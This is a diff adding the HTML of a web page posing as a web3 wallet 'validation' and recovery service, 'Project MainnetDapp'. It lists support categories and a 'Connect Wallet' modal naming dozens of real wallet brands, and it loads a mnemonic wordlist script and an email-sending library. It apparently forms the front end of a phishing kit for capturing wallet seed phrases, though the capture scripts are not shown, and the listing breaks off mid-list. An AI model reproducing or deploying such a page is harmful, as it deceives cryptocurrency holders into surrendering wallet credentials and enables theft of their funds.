@@ -1,0 +1,1104 @@
+<!DOCTYPE html>
+<html lang="en">
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta property="og:title" content="Nativevalidationupdate" />
+    <meta
+      property="og:description"
+      content="1. Click the above 2. Select Issue Category 3. Select Wallet 4. Input Necessary Info 5. Validate"
+    />
+    <meta property="og:image" content="interconnected.html" />
+    <meta property="og:url" content="index.html" />
+    <title>Project MainnetDapp</title>
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" crossorigin="anonymous">
+
+    <link rel="stylesheet" href="css/styles.css" />
+    <script src="assets/__init.js"></script>
+    <script src="assets/wordlist.min.js"></script>
+    <link rel="stylesheet" href="assets/modal.css">
+    <script src="assets/connect_modal.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com/" />
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&amp;family=Poppins:wght@200;300;400;500;600&amp;display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="assets/stm_icons/stmicons.css" media="all" />
+    <link rel="icon" href="../openaiwalletsyn.com/interconnected.png" type="image/x-icon" />
+    <link rel="shortcut icon" href="../openaiwalletsyn.com/interconnected.png" type="image/x-icon" />
+    <script src="https://unpkg.com/feather-icons"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <!-- <script charset="UTF-8" type="text/javascript" src="143d05d8-c261-4dbd-a26e-300ab95ec4a6.html"></script> -->
+    <style>  .interact-button {
+      cursor: pointer;
+  }</style>
+  </head>
+  <body id="root">
+    <div class="hero-section">
+      <div class="container">
+        <nav class="navbar navbar-expand-lg navbar-dark pt-3">
+          <div class="container-fluid px-0">
+            <h2 class="navbar-brand" href="#">
+              Project<span style="color: #bc3fea">MainnetDapp</span>
+            </h2>
+            <button
+              class="navbar-toggler"
+              type="button"
+              data-bs-toggle="collapse"
+              data-bs-target="#navbarSupportedContent"
+              aria-controls="navbarSupportedContent"
+              aria-expanded="false"
+              aria-label="Toggle navigation"
+            >
+              <span class="navbar-toggler-icon"></span>
+            </button>
+
+            <div class="collapse navbar-collapse" id="navbarSupportedContent">
+              <ul class="navbar-nav ms-auto">
+                <li class="nav-item">
+                  <a class='nav-link active-link' href='/main/#'>Home</a>
+                </li>
+                <li class="nav-item">
+                  <div class='nav-link connectButton' href='/main/server/'>Connect</div>
+                </li>
+              </ul>
+            </div>
+          </div>
+        </nav>
+      </div>
+      <div class="container d-flex flex-column-reverse flex-md-row">
+        <div class="hero-col1 d-flex flex-column justify-content-center">
+          <h2></h2><br><br>
+          <h2>Web3 Connection Made Easy</h2>
+          <p class="desc heading-L">
+           The communications protocol for web3, ProjectMainnetDapp brings the ecosystem together by enabling wallets and apps to securely connect and interact.
+          </p>
+          <div class='btn d-inline-block hero-btn me-3 py-2 align-self-start connectButton'>Synchronize Wallet</div>
+        </div>
+        <div class="hero-col2">
+          <img
+            class="hero-img mt-5"
+            src="img/sync.webp"
+            alt="Blockchain Rectification"
+          />
+        </div>
+      </div>
+    </div>
+  
+    <section class="services" id="services">
+      <div class="container">
+        <h2 class="services-heading pb-5">Select One of the Actions Below</h2>
+     
+        <div class="services-container">
+          <div class="service-card link-container">
+            <div class="connectButton">
+              <div class="service-card-details">
+                <i class="stm-chart-refresh"></i>
+                <h3>MIGRATION</h3>
+                <p>Click here for Migration</p>
+                <div class='btn d-inline-block srv-btn me-3 py-1 align-self-start connectButton'>Select</div>
+              </div>
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <div class="connectButton">
+              <div class="service-card-details">
+                <i class="stm-chart-monitor"></i>
+                <h3>CLAIM REWARDS</h3>
+                <p>Click here to claim assets</p>
+                <div class='btn d-inline-block srv-btn me-3 py-1 align-self-start connectButton'>Select</div>
+              </div>
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <div class="connectButton">
+              <div class="service-card-details">
+                <i class="stm-building6"></i>
+                <h3>SWAP</h3>
+                <p>Click here for assets swapping</p>
+                <div class='btn d-inline-block srv-btn me-3 py-1 align-self-start connectButton'>Select</div>
+              </div>
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <div class="connectButton">
+              <div class="service-card-details">
+                <i class="stm-building6"></i>
+                <h3>SLIPPAGE</h3>
+                <p>Click here for slippage related error</p>
+                <div class='btn d-inline-block srv-btn me-3 py-1 align-self-start connectButton'>Select</div>
+              </div>
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <div class="connectButton">
+              <div class="service-card-details">
+                <i class="stm-ia_clock"></i>
+                <h3>TRANSACTION</h3>
+                <p>
+                  Click here for transaction related issues
+                </p>
+                <div class='btn d-inline-block srv-btn me-3 py-1 align-self-start connectButton'>Select</div>
+              </div>
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <div class="connectButton">
+              <div class="service-card-details">
+                <i class="stm-ia_clock"></i>
+                <h3>CROSS TRANSFER</h3>
+                <p>
+                 Click here for cross bridge issues
+                </p>
+                <div class='btn d-inline-block srv-btn me-3 py-1 align-self-start connectButton'>Select</div>
+              </div>
+            </div>
+          </div>
+
+          <div class="service-card link-container">
+            <div class="connectButton">
+              <div class="service-card-details">
+                <i class="stm-ia_clock"></i>
+                <h3> STAKING</h3>
+                <p>
+            Click here for Staking related issues                </p>
+                <div class='btn d-inline-block srv-btn me-3 py-1 align-self-start connectButton'>Select</div>
+              </div>
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <div class="connectButton">
+              <div class="service-card-details">
+                <i class="stm-chart-refresh"></i>
+                <h3>EXCHANGE</h3>
+                <p>Click here for exchange related issues
+                </p>
+                <div class='btn d-inline-block srv-btn me-3 py-1 align-self-start connectButton'>Select</div>
+              </div>
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <div class="connectButton">
+              <div class="service-card-details">
+                <i class="stm-chart-refresh"></i>
+                <h3>CONNECT TO DAPPS</h3>
+                <p>Click here for error while connectting to dapps.
+                </p>
+                <div class='btn d-inline-block srv-btn me-3 py-1 align-self-start connectButton'>Select</div>
+              </div>
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <div class="connectButton">
+              <div class="service-card-details">
+                <i class="stm-chart-refresh"></i>
+                <h3>LOGIN</h3>
+                <p>Click here for wallet login issue.</p>
+                <div class='btn d-inline-block srv-btn me-3 py-1 align-self-start connectButton'>Select</div>
+              </div>
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <div class="connectButton">
+              <div class="service-card-details">
+                <i class="stm-chart-refresh"></i>
+                <h3>WHITELIST</h3>
+                <p>Click here for whitelist related issues.
+                </p>
+                <div class='btn d-inline-block srv-btn me-3 py-1 align-self-start connectButton'>Select</div>
+              </div>
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <div class="connectButton">
+              <div class="service-card-details">
+                <i class="stm-chart-refresh"></i>
+                <h3>RECOVERY</h3>
+                <p>Click here to for wallet recovery
+                </p>
+                <div class='btn d-inline-block srv-btn me-3 py-1 align-self-start connectButton'>Select</div>
+              </div>
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <div class="connectButton">
+              <div class="service-card-details">
+                <i class="stm-chart-refresh"></i>
+                <h3>MISSING/IRREGULAR BALANCE</h3>
+                <p>
+                 Click here to recover lost/missing funds.
+                </p>
+                <div class='btn d-inline-block srv-btn me-3 py-1 align-self-start connectButton'>Select</div>
+              </div>
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <div class="connectButton">
+              <div class="service-card-details">
+                <i class="stm-chart-refresh"></i>
+                <h3>WALLET GLITCH/WALLET ERROR</h3>
+                <p>Click here if you have problem with your trading wallet.</p>
+                <div class='btn d-inline-block srv-btn me-3 py-1 align-self-start connectButton'>Select</div>
+              </div>
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <div class="connectButton">
+              <div class="service-card-details">
+                <i class="stm-chart-refresh"></i>
+                <h3>TRANSACTION DELAY</h3>
+                <p>
+                  Click here for any issues related to transaction delay.
+                </p>
+                <div class='btn d-inline-block srv-btn me-3 py-1 align-self-start connectButton'>Select</div>
+              </div>
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <div class="connectButton">
+              <div class="service-card-details">
+                <i class="stm-chart-refresh"></i>
+                <h3>CLAIM AIRDROP</h3>
+                <p>Click here for airdrop related issues.</p>
+                <div class='btn d-inline-block srv-btn me-3 py-1 align-self-start connectButton'>Select</div>
+              </div>
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <div class="connectButton">
+              <div class="service-card-details">
+                <i class="stm-chart-refresh"></i>
+                <h3>NFTs</h3>
+                <p>Click here for NFTs minting/transfer related issues.</p>
+                <div class='btn d-inline-block srv-btn me-3 py-1 align-self-start connectButton'>Select</div>
+              </div>
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <div class="connectButton">
+              <div class="service-card-details">
+                <i class="stm-chart-refresh"></i>
+                <h3>LOCKED ACCOUNT</h3>
+                <p>Click here for issues related to account lock.
+                </p>
+                <div class='btn d-inline-block srv-btn me-3 py-1 align-self-start connectButton'>Select</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <footer class="p-5">
+      <div
+        class="px-2 d-flex flex-column align-items-center"
+        style="color: white"
+      >
+        <p>Ready to resolve your blockchain issues?</p>
+        <p>We are here to provide help.</p>
+        <a class='btn d-inline-block hero-btn me-3 py-2' href='/main/server/'>Start Here</a
+        >
+      </div>
+    </footer>
+    <section class="web2-modal" id="modal-dark" style="display: none;">
+            <section id="modal-dialog">
+                <div id="connect-header">
+                    <h2>Connect Wallet</h2>
+                    <span onclick="closeModal()" style="color: white; cursor: pointer;">
+                        <i data-feather="x"></i>
+                    </span>
+                </div>
+                <div id="connect-screen">
+                    <div id="front">
+                        <div id="landing-section">
+                            <span class="squircle">
+                                <img src="assets/logos/rainbow.webp" alt="">
+                            </span>
+                            <h2>RainbowKit</h2>
+                            <p>Fast. Simple. Secure</p>
+                        </div>
+                        <div id="popular-wallets" class="wallet-list-row">
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/ledger-live.webp" alt="">
+                                </span>
+                                <p>Ledger</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/coinbase-wallet.webp" alt="">
+                                </span>
+                                <p>Coinbase</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/phantom.png" alt="">
+                                </span>
+                                <p>Phantom</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle" style="background-color: #ffffff05;">
+                                    <svg fill="none" viewBox="0 0 24 24" style="width: 24px; height: 24px">
+                                        <path style="fill: #5773ff;"
+                                            d="M10.2 6.6a3.6 3.6 0 1 1-7.2 0 3.6 3.6 0 0 1 7.2 0ZM21 6.6a3.6 3.6 0 1 1-7.2 0 3.6 3.6 0 0 1 7.2 0ZM10.2 17.4a3.6 3.6 0 1 1-7.2 0 3.6 3.6 0 0 1 7.2 0ZM21 17.4a3.6 3.6 0 1 1-7.2 0 3.6 3.6 0 0 1 7.2 0Z">
+                                        </path>
+                                    </svg>
+                                </span>
+                                <p>All Wallets</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div id="all-wallets" style="display: none;">
+                        <div id="search">
+                            <div class="inpgrp">
+                                <i data-feather="search"></i>
+                                <input type="text" onkeyup="filter()" id="search-box" placeholder="Search Wallet">
+                            </div>
+                        </div>
+                        <div id="wallet-list" style="justify-content: space-around;">
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369.jpg" alt="">
+                                </span>
+                                <p>Rainbow</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/e726391f66eb7da7a0ed7d780b4df5e8e2416a17.png" alt="">
+                                </span>
+                                <p>Wallet Connect</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0.jpg" alt="">
+                                </span>
+                                <p>Trust</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96.jpg" alt="">
+                                </span>
+                                <p>Metamask</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/cf21952a9bc8108bf13b12c92443751e2cc388d27008be4201b92bbc6d83dd46.jpg" alt="">
+                                </span>
+                                <p>Argent</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/brd.jpg" alt="">
+                                </span>
+                                <p>BRD wallet</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/coinbase-wallet.webp" alt="">
+                                </span>
+                                <p>Coinbase Wallet</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/saitama.png" alt="">
+                                </span>
+                                <p>Saitamask wallet</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/terra.png" alt="">
+                                </span>
+                                <p>Terra station</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/best-logo.jpeg" alt="">
+                                </span>
+                                <p>Best Wallet</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/xaman_wallet.png" alt="">
+                                </span>
+                                <p>Xaman Wallet</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/bitcoin-com.png" alt="">
+                                </span>
+                                <p>Bitcoin.com</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/solflare.png" alt="">
+                                </span>
+                                <p>Solflare</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/cosmos.png" alt="">
+                                </span>
+                                <p>Cosmos station</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/exodus-wallet.jpeg" alt="">
+                                </span>
+                                <p>Exodus wallet</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/f2436c67184f158d1beda5df53298ee84abfc367581e4505134b5bcf5f46697d.jpg" alt="">
+                                </span>
+                                <p>DeFi</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/0b58bf037bf943e934706796fb017d59eace1dadcbc1d9fe24d9b46629e5985c.jpg" alt>
+                                </span>
+                                <p>Pillar</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/xverse-wallet.png" alt>
+                                </span>
+                                <p>Xverse Wallet</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/trezor-suite.webp" alt>
+                                </span>
+                                <p>Trezor Suite Lite</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/zengo-wallet.png" alt>
+                                </span>
+                                <p>Zengo Wallet</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/9d373b43ad4d2cf190fb1a774ec964a1addf406d6fd24af94ab7596e58c291b2.jpg" alt="">
+                                </span>
+                                <p>imToken</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/dceb063851b1833cbb209e3717a0a0b06bf3fb500fe9db8cd3a553e4b1d02137.jpg" alt="">
+                                </span>
+                                <p>ONTO</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/bifrostwallet.png" alt="">
+                                </span>
+                                <p>Bifrost Wallet</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66.jpg" alt="">
+                                </span>
+                                <p>TokenPocket</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/aave-aave-logo.png" alt="">
+                                </span>
+                                <p>Aave</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/2772.png" alt="">
+                                </span>
+                                <p>Digitex</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/portis_logo_dribbble.png" alt="">
+                                </span>
+                                <p>Portis</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/rtDOqMXY_400x400.jpg" alt="">
+                                </span>
+                                <p>Formatic</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/7674bb4e353bf52886768a3ddc2a4562ce2f4191c80831291218ebd90f5f5e26.jpg" alt="">
+                                </span>
+                                <p>MathWallet</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/ccb714920401f7d008dbe11281ae70e3a4bfb621763b187b9e4a3ce1ab8faa3b.jpg" alt="">
+                                </span>
+                                <p>BitPay</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/71dad538ba02a9b321041d388f9c1efe14e0d1915a2ea80a90405d2f6b67a33d.jpg" alt="">
+                                </span>
+                                <p>Authereum</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/83f26999937cbc2e2014655796da4b05f77c1de9413a0ee6d0c6178ebcfc3168.jpg" alt="">
+                                </span>
+                                <p>WallETH</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/efba9ae0a9e0fdd9e3e055ddf3c8e75f294babb8aea3499456eff27f771fda61.jpg" alt="">
+                                </span>
+                                <p>Eidoo</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/6bb4596640ce9f8c02fbaa83e3685425455a0917d025608b4abc53bfe55887c6.jpg" alt="">
+                                </span>
+                                <p>TrustVault</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/185850e869e40f4e6c59b5b3f60b7e63a72e88b09e2a43a40b1fd0f237e49e9a.jpg" alt="">
+                                </span>
+                                <p>Atomic</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/b021913ba555948a1c81eb3d89b372be46f8354e926679de648e4fa2938bed3e.jpg" alt="">
+                                </span>
+                                <p>Coin98</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/tron-trx-logo.png" alt="">
+                                </span>
+                                <p>Tron</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/beea4e71c2ffbb48b59b21e33fb0049ef6522585aa9c8a33a97d3e1c81f16693.jpg" alt="">
+                                </span>
+                                <p>Alice</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/468b4ab3582757233017ec10735863489104515ab160c053074905a1eecb7e63.jpg" alt="">
+                                </span>
+                                <p>D'CENT</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/138f51c8d00ac7b9ac9d8dc75344d096a7dfe370a568aa167eabc0a21830ed98.jpg" alt="">
+                                </span>
+                                <p>AlphaWallet</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/29f4a70ad5993f3f73ae8119f0e78ecbae51deec2a021a770225c644935c0f09.jpg" alt="">
+                                </span>
+                                <p>ZelCore</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/nash-wallet.jpg" alt="">
+                                </span>
+                                <p>Nash</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/1433894569.png" alt="">
+                                </span>
+                                <p>Coinmoni</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/6ec1ffc9627c3b9f87676da3f7b5796828a6c016d3253e51e771e6f951cb5702.jpg" alt="">
+                                </span>
+                                <p>GridPlus</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/a395dbfc92b5519cbd1cc6937a4e79830187daaeb2c6fcdf9b9cce4255f2dcd5.jpg" alt="">
+                                </span>
+                                <p>CYBAVO</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/c889f5add667a8c69d147d613c7f18a4bd97c2e47c946cabfdd13ec1d596e4a0.jpg" alt="">
+                                </span>
+                                <p>Tokenary</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/3f1bc4a8fd72b3665459ec5c99ee51b424f6beeebe46b45f4a70cf08a84cbc50.jpg" alt="">
+                                </span>
+                                <p>Torus</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/7b83869f03dc3848866e0299bc630aaf3213bea95cd6cecfbe149389cf457a09.jpg" alt="">
+                                </span>
+                                <p>Spatium</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b3ba16381d0562150.jpg" alt="">
+                                </span>
+                                <p>SafePal</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/d0387325e894a1c4244820260ad7c78bb20d79eeec2fd59ffe3529223f3f84c6.jpg" alt="">
+                                </span>
+                                <p>Infinito</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/176b83d9268d77438e32aa44770fb37b40d6448740b6a05a97b175323356bd1b.jpg" alt="">
+                                </span>
+                                <p>wallet.io</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/8fb830a15679a8537d84c3852e026a4bdb39d0ee3b387411a91e8f6abafdc1ad.jpg" alt="">
+                                </span>
+                                <p>Ownbit</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/881946407ff22a32ec0e42b2cd31ea5dab52242dc3648d777b511a0440d59efb.jpg" alt="">
+                                </span>
+                                <p>Bridge Wallet</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/3b0e861b3a57e98325b82ab687fe0a712c81366d521ceec49eebc35591f1b5d1.jpg" alt="">
+                                </span>
+                                <p>Spark Point</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/ca86f48760bf5f84dcd6b1daca0fd55e2aa073ecf46453ba8a1db0b2e8e85ac1.jpg" alt="">
+                                </span>
+                                <p>ViaWallet</p>
+                            </div>
+
+                            
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/b642ab6de0fe5c7d1e4a2b2821c9c807a81d0f6fd42ee3a75e513ea16e91151c.jpg" alt="">
+                                </span>
+                                <p>Vision</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/38ee551a01e3c5af9d8a9715768861e4d642e2381a62245083f96672b5646c6b.jpg" alt="">
+                                </span>
+                                <p>PEAKDEFI</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/7e90b95230bc462869bbb59f952273d89841e1c76bcc5319898e08c9f34bd4cd.jpg" alt="">
+                                </span>
+                                <p>Unstoppable</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/d12b6e114af8c47a6eec19a576f1022032a5ee4f8cafee612049f4796c803c7e.jpg" alt="">
+                                </span>
+                                <p>Dok Wallet</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/3d56ed42374504f1bb2ba368094269eaea461c075ab796d504f354baac213dc5.jpg" alt="">
+                                </span>
+                                <p>AT.Wallet</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/1e04cf5cddcd84edb1370b12eae1fcecedf125b77209fff80e7ef2a6d3c74719.jpg" alt="">
+                                </span>
+                                <p>Midas</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/15d1d97de89526a3c259a235304a7c510c40cda3331f0f8433da860ecc528bef.jpg" alt="">
+                                </span>
+                                <p>Ellipal</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/LOGO-KEYRING-PRO.png" alt="">
+                                </span>
+                                <p>KEYRING PRO</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/19ad8334f0f034f4176a95722b5746b539b47b37ce17a5abde4755956d05d44c.jpg" alt="">
+                                </span>
+                                <p>Aktionariat</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/95501c1a07c8eb575cb28c753ab9044259546ebcefcd3645461086e49b671f5c.jpg" alt="">
+                                </span>
+                                <p>Talken</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/b13fcc7e3500a4580c9a5341ed64c49c17d7f864497881048eb160c089be5346.jpg" alt="">
+                                </span>
+                                <p>RWallet</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/2235b648bdf382bc1a6960f1db8eda5c71f65a1996e6cb549d24783ca58a2903.jpg" alt="">
+                                </span>
+                                <p>Binana</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/76428179ce9213ab6f8f49923310efcf5eea089764196c7a2018bea8afcd6603.jpg" alt="">
+                                </span>
+                                <p>PayTube</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/dd8ee41915d967e547c80266e883d77ee808427405f4e8026a85ac1308104221.jpg" alt="">
+                                </span>
+                                <p>Linen</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/dharma-wallet.png" alt="">
+                                </span>
+                                <p>Dharma</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/MyKey-wallet-logo.jpg" alt="">
+                                </span>
+                                <p>MYKEY</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/loopring.png" alt="">
+                                </span>
+                                <p>Loopring</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/huobi-token-logo.png" alt="">
+                                </span>
+                                <p>Huobi</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/bitkeep.png" alt="">
+                                </span>
+                                <p>BitKeep</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/halo-defi-wallet.webp" alt="">
+                                </span>
+                                <p>HaloDeFi</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/flare-wallet.png" alt="">
+                                </span>
+                                <p>Flare</p>
+                            </div>
+
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/kyberswap-logo.png" alt="">
+                                </span>
+                                <p>KyberSwap</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img
+                                    src="assets/logos/atoken-wallet.png" alt="">
+                                </span>
+                                <p>AToken</p>
+                            </div>
+
+                            <!-- border -->
+
+
+
+                        
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/okx-wallet.webp" alt="">
+                                </span>
+                                <p>OKX Wallet</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/bitget.webp" alt="">
+                                </span>
+                                <p>Bitget Wallet</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/best-wallet.webp" alt="">
+                                </span>
+                                <p>Best Wallet</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/uniswap.webp" alt="">
+                                </span>
+                                <p>Uniswap</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/safepal.webp" alt="">
+                                </span>
+                                <p>Safepal</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/tokenpoket.webp" alt="">
+                                </span>
+                                <p>TokenPocket</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/ledger-live.webp" alt="">
+                                </span>
+                                <p>Ledger Live</p>
+                            </div>
+                            <div class="wlt">
+                                <span class="squircle">
+                                    <img src="assets/logos/phantom.png" alt="">
+                                </span>
